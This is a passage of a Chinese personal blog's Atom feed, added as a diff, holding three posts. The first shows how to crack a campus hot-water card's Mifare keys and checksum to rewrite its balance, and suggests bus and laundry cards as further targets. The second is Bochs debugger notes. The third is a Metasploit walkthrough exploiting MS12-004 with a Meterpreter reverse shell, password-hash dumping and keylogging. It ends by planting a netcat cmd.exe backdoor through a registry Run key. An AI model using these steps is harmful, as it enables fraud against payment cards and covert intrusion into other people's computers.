+<p><td width="60">Never</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">Never</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">1</td></p>
+<p><td width="48">0</td></p>
+<p><td width="48">0</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyB</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">1</td></p>
+<p><td width="48">1</td></p>
+<p><td width="48">0</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">0</td></p>
+<p><td width="48">0</td></p>
+<p><td width="48">1</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyA|B</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">0</td></p>
+<p><td width="48">1</td></p>
+<p><td width="48">1</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyB</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">1</td></p>
+<p><td width="48">0</td></p>
+<p><td width="48">1</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">KeyB</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td><br></p>
+<p><tr></tr></p>
+<p><td width="48">1</td></p>
+<p><td width="48">1</td></p>
+<p><td width="48">1</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">KeyA|B</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td></p>
+<p><td width="60">Never</td><br><br><br><br>例如：当块3的存取控制位C13 C23 C33=1 0 0时，表示：</p>
+<p>密码A：不可读，验证KEYA或KEYB正确后，可写（更改）。</p>
+<p>存取控制：验证KEYA或KEYB正确后，可读、可写。</p>
+<p>密码B：验证KEYA或KEYB正确后，可读、可写。</p>
+<p>知道这些东西已经足够了，就看怎么利用了。</p>
+<p><strong>0x01 破解key，读取数据</strong></p>
+<p>大多数卡中的数据除了第一扇区记录卡的信息外，剩下的15个扇区只有一个扇区记录金额和校验信息。剩下的扇区都是空数据。keyA keyB都是默认的。关于破解的算法08年国外已经有人公布 。运气好的话用Mifare Classic Offline Cracker就可以读到卡中16个扇区的数据。</p>
+<p><img src="http://ccwyy.img43.wal8.com/img43/507648_20150116191603/14217545389.png" alt=""></p>
+<p>但读到数据只是第一步，还需要知道那里存的是金额哪里是校验位，以及校验算法</p>
+<p><strong>0x02  破解校验算法</strong></p>
+<p>现在只看金额和校验数据的8个字节，通过两张卡都刷了两次得到以下数据</p>
+<p>卡A</p>
+<p>01  14   03  20  03  bd    a8   f1          金额 957</p>
+<p>01  14  03  20  03   bc    a9   f1          金额 956</p>
+<p>卡B</p>
+<p>01  14  03  20  20   40   56   f1           金额 64</p>
+<p>01  14  03  20  20    3f    29   f1           金额 63</p>
+<p>这里需要对十六进制数据比较敏感。 0x03BD 两个字节就是 957    0x03bc是 956</p>
+<hr>
+<p>2014年12月7日10:19:27</p>
+<ul>
+<li>上次的工作只进行了一半，只知道了保存金额的位置。那就是0x384  0x285 这两个地址的数值。而且还是大端模式的存储。再来分析下。<br>01  14   03  20  03  bd    a8   f1</li>
+</ul>
+<p>01  14  03  20  03   bc    a9   f1</p>
+<p>01  14  03  20  20   40   56   f1</p>
+<p>01  14  03  20  20    3f    29   f1</p>
+<ul>
+<li>似乎前四个字节和最后一个字节的数值不变。那么现在只有一个字节的数据定义不清楚了。 这就是传说中的校验数据。这一字节的数据验证金额是否合法。不合法的话就算前面两个字节再大，也会不认得。 那么怎么破解校验呢。<br>03  bd    a8                03   bc    a9               20   40   56                20    3f    29</li>
+</ul>
+<p>这三次的校验字节分别是 0xa8  0xa9  0x56   0x29 这和前面两个字节的数据有什么关系！！  还是看不出来 。还是采集的数据太少了，我再找几张卡去。</p>
+<p>A 、B、C、D张卡共刷了50次左右的数据</p>
+<p>//卡A   +1<br>01 14 03 20 03 bd a8 f1<br>01 14 03 20 03 bc a9 f1</p>
+<p>01 14 03 20 01 d4 c3 f1<br>01 14 03 20 01 d3 c4 f1<br>01 14 03 20 01 d2 c5 f1<br>01 14 03 20 01 d1 c6 f1<br>01 14 03 20 01 d0 c7 f1<br>01 14 03 20 01 cf d8 f1<br>01 14 03 20 01 ce d9 f1</p>
+<p>01 14 03 20 01 ba ad f1<br>01 14 03 20 01 b9 ae f1<br>01 14 03 20 01 b8 af f1</p>
+<p>//卡B   +3-1+3-1+3-1<br>01 14 03 20 20 40 56 f1</p>
+<p>01 14 03 20 20 3f 29 f1<br>01 14 03 20 20 3e 28 f1<br>01 14 03 20 20 3d 2b f1<br>01 14 03 20 20 3c 2a f1<br>01 14 03 20 20 3b 2d f1<br>01 14 03 20 20 3a 2c f1<br>01 14 03 20 20 39 2f f1</p>
+<p>01 14 03 20 20 1c 0a f1<br>01 14 03 20 20 1b 0d f1<br>01 14 03 20 20 1a 0c f1</p>
+<p>//卡C    +3-1-5-1+3-1-5-1+3<br>01 14 03 20 04 b6 a4 f1<br>01 14 03 20 04 b5 a7 f1<br>01 14 03 20 04 b4 a6 f1<br>01 14 03 20 04 b3 a1 f1<br>01 14 03 20 04 b2 a0 f1<br>01 14 03 20 04 b1 a3 f1<br>01 14 03 20 04 b0 a2 f1<br>01 14 03 20 04 af bd f1<br>01 14 03 20 04 ae bc f1<br>01 14 03 20 04 ad bf f1</p>
+<p>//卡D     -1+3-1+3<br>01 14 03 20 09 8f 90 f1</p>
+<p>01 14 03 20 08 5d 43 f1<br>01 14 03 20 08 5c 42 f1<br>01 14 03 20 08 5b 45 f1<br>01 14 03 20 08 5a 44 f1<br>01 14 03 20 08 59 47 f1</p>
+<p>01 14 03 20 08 3a 24 f1<br>01 14 03 20 08 39 27 f1</p>
+<p>01 14 03 20 08 38 26 f1</p>
+<ul>
+<li>看了几个小时，找到了规律。红色部分 3 -&gt;2   1-&gt;0 。 再看看其他的数据，都符合这个规律。0&lt;-&gt;1,2&lt;-&gt;3,4&lt;-&gt;5 …… E&lt;-&gt;F。<br>&nbsp;</li>
+</ul>
+<p>好了，校验字节的高四位已经明了。只剩下低四位了。 又看了几个小时，找到了最后一个字母的规律。结果是每张卡的校验算法都是不一样的。</p>
+<ul>
+<li>卡A<br>//卡A   +1</li>
+</ul>
+<p>01 14 03 20 01 d4 c3 f1<br>01 14 03 20 01 d3 c4 f1<br>01 14 03 20 01 d2 c5 f1<br>01 14 03 20 01 d1 c6 f1<br>01 14 03 20 01 d0 c7 f1<br>01 14 03 20 01 cf d8 f1<br>01 14 03 20 01 ce d9 f1</p>
+<p>当金额每次减一 即01 d4、01 d3、 01 d1 、01 d0、 01 cf、01 ce   校验字节的低四位分别是 3、4、5、6、7、8、9</p>
+<ul>
+<li>卡B<br>01 14 03 20 20 3f 29 f1<br>01 14 03 20 20 3e 28 f1<br>01 14 03 20 20 3d 2b f1<br>01 14 03 20 20 3c 2a f1<br>01 14 03 20 20 3b 2d f1<br>01 14 03 20 20 3a 2c f1<br>01 14 03 20 20 39 2f f1</li>
+</ul>
+<p>当金额每次减一，校验字节的低四位分别是 9、8、b、a、d、c、f       规律 ：+3-1+3-1+3-1………..</p>
+<ul>
+<li>卡C<br>01 14 03 20 04 b6 a4 f1<br>01 14 03 20 04 b5 a7 f1<br>01 14 03 20 04 b4 a6 f1<br>01 14 03 20 04 b3 a1 f1<br>01 14 03 20 04 b2 a0 f1<br>01 14 03 20 04 b1 a3 f1<br>01 14 03 20 04 b0 a2 f1<br>01 14 03 20 04 af bd f1<br>01 14 03 20 04 ae bc f1<br>01 14 03 20 04 ad bf f1</li>
+</ul>
+<p>规律 ：+3-1-5-1+3-1-5-1+3 ………..</p>
+<ul>
+<li>卡D<br>01 14 03 20 08 5d 43 f1<br>01 14 03 20 08 5c 42 f1<br>01 14 03 20 08 5b 45 f1<br>01 14 03 20 08 5a 44 f1<br>01 14 03 20 08 59 47 f1</li>
+</ul>
+<p>规律 ：-1+3-1+3 ………..</p>
+<p>为什吗只有B和D的校验算法是一样的！！！百思不得其解 ;-(      想了想应该有下面两个原因</p>
+<ol>
+<li>校验结果很有可能和每张卡的ID有关，每张卡的ID在第0扇区存着，按照规定是不能改的。</li>
+<li><del>校验结果和0x384 处的的值有关。 </del>想想还是不可能，因为在0x384 值不变的情况下 0x386 第四位的值已经变了。<br><strong>  0X03 总结</strong></li>
+</ol>
+<p>现在已经可以改写卡的数据了，改完之后计算出相应的校验字节，写入0x386就可以。麻烦的是没有一个统一的算法算。只能先把每张卡的规律找出来。我觉得肯定有统一的算法，只是我没有总结出来而已。要分析清楚，需要采集大量的数据，没那个时间。反正目达到就好。有兴趣的同学还可以继续研究，比如说你的洗澡卡，洗衣卡，矿泉水卡，公交卡、、、</p>
+<p>写入数据的时候需要keyA 或 keyB  。 就这样。</p>
+<p>我可是好人，没有做坏事。为了免去不必要的麻烦，还是毕业之后在公布 吧 。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;今天遇到点烦心事，只看了GDT（Global Descriptor Table）相关的内容，没有继续完成操作系统的引导部分。不过晚上热水卡没有钱了，刚好今天OS没有大的进展，顿时萌生了“自力更生，丰衣足食”的良好念头 :-)   。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Hacking" scheme="http://0x7c00.com/categories/Hacking/"/>
+    
+    
+      <category term="122U" scheme="http://0x7c00.com/tags/122U/"/>
+    
+      <category term="Mifare1" scheme="http://0x7c00.com/tags/Mifare1/"/>
+    
+      <category term="RFID" scheme="http://0x7c00.com/tags/RFID/"/>
+    
+      <category term="热水卡" scheme="http://0x7c00.com/tags/%E7%83%AD%E6%B0%B4%E5%8D%A1/"/>
+    
+      <category term="破解" scheme="http://0x7c00.com/tags/%E7%A0%B4%E8%A7%A3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Bochs</title>
+    <link href="http://0x7c00.com/2014/hello-world-2-2-2/"/>
+    <id>http://0x7c00.com/2014/hello-world-2-2-2/</id>
+    <published>2014-11-19T11:31:53.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>刚刚编译好的新鲜Bochs出炉了。编译这个还真是费尽周折。先从Bochs官网下载win32 编译好的程序。打开发现竟然不能模拟80386CPU，可能是80386太古老了吧。 找了半天才在stackoverflow上看到要重新编译。下载源码，上传到RaspberryPi上加–enable-cpu-level=3  config。然后再弄到win上用VS2013编译。</p>
+<a id="more"></a>
+<p>加载最新的bios不兼容，下载了一个很旧的bochs版本在里面找到了bios镜像。可以运行我的MBR了。</p>
+<p>bochs 常用的命令：</p>
+<p># </p>
+<p>&nbsp;</p>
+<p>From here, you may use the following commands:</p>
+<div class="SECTION"><br><pre class="SCREEN">  c                           continue executing<br>  s     [count]               execute count instructions, default is 1<br>  Ctrl-C                      stop execution, and return to command line prompt<br>  Ctrl-D                      if at empty line on command line, exit<br>  q                           quit debugger and execution<br><br>  vb seg:off                  Set a virtual address instruction breakpoint<br>  lb addr                     Set a linear address instruction breakpoin<br>  pb     [<em>] addr             Set a physical address instruction breakpoin<br>  b      [</em>] addr<br>  info break                  Display state of all current breakpoints<br>  bpe    n                    Enable a breakpoint<br>  bpd    n                    Disable a breakpoint<br>  d      n                    Delete a breakpoint</pre><br></div><br><div class="SECTION"><br><pre class="SCREEN">  watch r     addr            Insert a read watch point at physical address <code>addr</code><br>  watch w     addr            Insert a write watch point at physical address <code>addr</code><br>  watch                       Display state of current memory watchpoints<br>  watch stop                  Stop simulation when a watchpoint is encountered (default)<br>  watch continue              Do not stop simulation when a watchpoint is encountered<br>  unwatch addr                Remove watchpoint to specific physical address<br>  unwatch                     Remove all watch points<br>  trace-mem on/off            Enable/Disable memory access tracing</pre><br></div><br><div class="SECTION"><br><pre class="SCREEN">  x  /nuf addr      Examine memory at linear address addr<br>  xp /nuf addr      Examine memory at physical address addr<br>     n              Count of how many units to display<br>     u              Unit size; one of<br>                      b Individual bytes<br>                      h Halfwords (2 bytes)<br>                      w Words (4 bytes)<br>                      g Giant words (8 bytes)<br>                      NOTE: these are <em>not</em> typical Intel nomenclature sizes,<br>                            but they are consistent with GDB convention.<br>     f              Printing format.  one of<br>                      x Print in hexadecimal<br>                      d Print in decimal<br>                      u Print in unsigned decimal<br>                      o Print in octal<br>                      t Print in binary<br><br>    n, f, and u are optional parameters.  u and f default to the last values<br>    you used, or to w(words) and x(hex) if none have been supplied.<br>    n currently defaults to 1.  If none of these optional parameters are<br>    used, no slash should be typed.  addr is also optional.  If you don’t<br>    specify it, it will be the value the next address (as if you had<br>    specified n+1 in the last x command).<br><br>  setpmem addr datasize val    Set physical memory location of size<br>                               datasize to value val.<br>  writemem                     dump a number of bytes of virtual memory starting from<br>                               the specified linear address into a file<br>  crc  addr1  addr2            Show CRC32 for physical memory range addr1..addr2</pre><br></div><br><div class="SECTION"><br><pre class="SCREEN">  r|reg|regs|registers         List of CPU integer registers and their contents<br>  sreg                         Show segment registers and their contents<br>  dreg                         Show debug registers and their contents<br>  creg                         Show control registers and their contents<br>  info cpu                     List of all CPU registers and their contents<br>  info eflags                  Show decoded EFLAGS register<br>  info break                   Information about current breakpoint status<br>  set reg = expr<br>  trace on                    Disassemble every executed instruction. Note</pre><br></div><br><div class="SECTION"><br><pre class="SCREEN">                              that instructions which caused exceptions are<br>                              not really executed, and therefore not traced.<br>  trace off                   Disable instruction tracing.<br>  具体详见  <strong><a href="http://bochs.sourceforge.net/doc/docbook/" title="bochs documention" target="_blank" rel="external">bochs documention</a><br><br>2014年11月20日17:54:13 
+ </strong> 第一个汇编函数可以运行了<br><img src="http://ccwyy.img43.wal8.com/img43/507648_20150116191603/142175554866.png" alt=""><br>    现在十一点半，顺利从磁盘加载512KB数据到内存0x20000-0x9ffff。本来想从0x10000处加载的，<br>可是在0x10000附近开始加载只能读大概61个扇区，然后就莫名其妙的进入死循环了。肯定和其实地<br>址有关，但是在附近换了个地址也只能读61扇区。 0x20000开始就没有问题了。莫名其妙。今天完成<br>了两个函数 printf 和 D2M 。还算顺利。<br><br></pre><br></div>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;刚刚编译好的新鲜Bochs出炉了。编译这个还真是费尽周折。先从Bochs官网下载win32 编译好的程序。打开发现竟然不能模拟80386CPU，可能是80386太古老了吧。 找了半天才在stackoverflow上看到要重新编译。下载源码，上传到RaspberryPi上加–enable-cpu-level=3  config。然后再弄到win上用VS2013编译。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Operating System" scheme="http://0x7c00.com/categories/Operating-System/"/>
+    
+    
+      <category term="A32" scheme="http://0x7c00.com/tags/A32/"/>
+    
+      <category term="Bochs" scheme="http://0x7c00.com/tags/Bochs/"/>
+    
+      <category term="qemu" scheme="http://0x7c00.com/tags/qemu/"/>
+    
+      <category term="模拟器" scheme="http://0x7c00.com/tags/%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
+    
+      <category term="汇编" scheme="http://0x7c00.com/tags/%E6%B1%87%E7%BC%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用Metasploit进行渗透测试</title>
+    <link href="http://0x7c00.com/2012/Penetration-testing-with-Metasploit/"/>
+    <id>http://0x7c00.com/2012/Penetration-testing-with-Metasploit/</id>
+    <published>2012-04-11T03:35:53.000Z</published>
+    <updated>2017-05-08T17:19:24.599Z</updated>
+    
+    <content type="html"><![CDATA[<p>声明：本教程仅限供广大网络安全爱好者交流学习之用，任何人不得用于非法用途，否则后果自负。</p>
+<p>最近在玩Backtrack 5 ，就把最近学到的东西分享下。</p>
+<p>所有工具都是Backtrack 5 自带的，</p>
+<p>用到的工具 ： 大名鼎鼎的Metasploit Feamwork    还有 Netcat</p>
+<a id="more"></a>
+<p>要利用的漏洞：MS12-004 ，虽然漏洞是几个月前出的了，但这里只做渗透演示，重点在讲解工具的使用方法。</p>
+<p>废话不说，看步骤 ：</p>
+<p>&nbsp;</p>
+<p>在控制台执行 msfconsole 启动Metasploit  ，</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/1.png" alt=""></p>
+<p>&nbsp;</p>
+<p>输入命令 search ms12_004，我们来找找ms12-004漏洞的利用模块</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/2.png" alt=""></p>
+<p>&nbsp;</p>
+<p>已经找到了，接下来使用该模块</p>
+<p>输入命令  Use exploits/windows/browser/ms12_004_midi</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/3.png" alt=""></p>
+<p>&nbsp;</p>
+<p>接下来输入命令 show options ，显示该漏洞的基本信息，以及要设置的参数</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/4.png" alt=""></p>
+<p>&nbsp;</p>
+<p>设置参数：</p>
+<p>输入命令 ： set  SRVHOST  192.168.42.139</p>
+<p>Set  PAYLOAD  windows/meterpreter/reverse_tcp</p>
+<p>Set  LHOST  192.168.42.130</p>
+<p>Set  URIOATH  /</p>
+<p>&nbsp;</p>
+<p>最后 再输入show options ，查看是否设置好</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/5.png" alt=""></p>
+<p>&nbsp;</p>
+<p>已经OK了，开始渗透。</p>
+<p>执行命令 ：Exploit</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/6.png" alt=""></p>
+<p>&nbsp;</p>
+<p>可以看到服务已经启动了，链接地址<a href="http://192.168.42.130:8080/" target="_blank" rel="external">http://192.168.42.130:8080/</a></p>
+<p>在用Xp打开恶意链接地址 <a href="http://192.168.42.130:8080/" target="_blank" rel="external">http://192.168.42.130:8080/</a></p>
+<p><img src="http://pic.0x7c00.cn/metasploit/7.png" alt=""></p>
+<p>&nbsp;</p>
+<p>BackTrack 开始渗透，</p>
+<p>这边BT5已经有反应了 ，渗透成功~</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/8.png" alt=""></p>
+<p>&nbsp;</p>
+<p>输入命令 Sessions</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/9.png" alt=""></p>
+<p>&nbsp;</p>
+<p>我们看到有一个会话，会话的 ID 是1  ，开打开这个会话</p>
+<p>输入命令 Sessions  -i  1 这时，我们已经进入了Meterpreter</p>
+<p>&nbsp;</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/10.png" alt=""></p>
+<p>&nbsp;</p>
+<p>Meterpreter 是一个很强大的 payload ， 具体说明输入 help 可以看到，</p>
+<p>Meterpreter  &gt;  hashdump     // 可以看到远程主机帐号和加密后的密码</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/11.png" alt=""></p>
+<p>这里再说几个常用的Meterpreter  命令</p>
+<p>&nbsp;</p>
+<p>Meterpreter  &gt;  keyscan_start   //开启键盘记录</p>
+<p>&nbsp;</p>
+<p>Meterpreter  &gt;  heyscan_dump  //  查看键盘记录的内容</p>
+<p>Meterpreter  &gt;  keyscan_stop    //  关闭键盘记录</p>
+<p>Meterpreter  &gt;  shell   //看下图大家都懂的</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/12.png" alt=""></p>
+<p>Meterpreter  &gt; ps  //  获取远程主机进程列表，比windows自带的任务管理器清晰多了</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/13.png" alt=""></p>
+<p>Meterpreter  &gt; screenshot   //  截取远程桌面屏幕</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/14.png" alt=""></p>
+<p>Meterpreter  &gt; run vnc  // 开启远程主机vnc 服务</p>
+<p>过一会，可以看到桌面，并且可以控制鼠标和键盘</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/15.png" alt=""></p>
+<p>&nbsp;</p>
+<p>好，下来我们来留后门，方便以后常来 ~</p>
+<p>先上传 nc.exe（netcant）到windows的systen32文件夹下</p>
+<p>Upload   /pentest/windows-binaries/tools/nc.exe   c:\windows\system32</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/16.png" alt=""></p>
+<p>&nbsp;</p>
+<p>已经成功了，下来我们将nc.exe加到注册表，让他开机自启动</p>
+<p>&nbsp;</p>
+<p>先查看注册表</p>
+<p>Reg  enumkey  -k  HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/17.png" alt=""></p>
+<p>已经可以看到注册表键值了</p>
+<p>下来加入注册表</p>
+<p>Reg  setval  -k  HKLM\SOFTWARE\Miorosoft\Windows\CurrentVersion\Run  -v  backdoor  -d  c:\windows\system32\nc.exe”-L  -d  -p  443  cmd.exe”</p>
+<p>（上面是一条命令）</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/18.png" alt=""></p>
+<p>提示成功，看看XP的注册表</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/19.png" alt=""></p>
+<p>已经有了这个键值</p>
+<p>我们重启远程主机试下</p>
+<p>输命令 reboot</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/20.png" alt=""></p>
+<p>由于远程主机已经关闭，显示链接断开 ，等xp重启后，我们试试留的后门</p>
+<p>Telnet   192.168.42.139   443</p>
+<p><img src="http://pic.0x7c00.cn/metasploit/21.png" alt=""></p>
+<p>已经连接成功了  : )  .。刚接触BT5，各位见笑了  … 论坛有玩B5或者 Metasploit 的朋友可以联系我，求交流。</p>
+<p>QQ :791628659</p>
+<pre><code>By  Breaker
+</code></pre><p>本文地址<a href="http://blog.0x7c00.cn/?p=165" target="_blank" rel="external">http://0x7c00.cn/?p=165</a></p>
+<p>2012年4月10日11:34:16</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;声明：本教程仅限供广大网络安全爱好者交流学习之用，任何人不得用于非法用途，否则后果自负。&lt;/p&gt;
+&lt;p&gt;最近在玩Backtrack 5 ，就把最近学到的东西分享下。&lt;/p&gt;
+&lt;p&gt;所有工具都是Backtrack 5 自带的，&lt;/p&gt;
+&lt;p&gt;用到的工具 ： 大名鼎鼎的Metasploit Feamwork    还有 Netcat&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Hacking" scheme="http://0x7c00.com/categories/Hacking/"/>
+    
+    
+      <category term="Backtrack" scheme="http://0x7c00.com/tags/Backtrack/"/>
+    
+      <category term="Breaker" scheme="http://0x7c00.com/tags/Breaker/"/>
+    
+      <category term="BT5" scheme="http://0x7c00.com/tags/BT5/"/>
+    
+      <category term="Metasploit" scheme="http://0x7c00.com/tags/Metasploit/"/>
+    
+      <category term="meterpreter" scheme="http://0x7c00.com/tags/meterpreter/"/>
+    
+      <category term="Netcat" scheme="http://0x7c00.com/tags/Netcat/"/>
+    
+      <category term="漏洞" scheme="http://0x7c00.com/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+</feed>
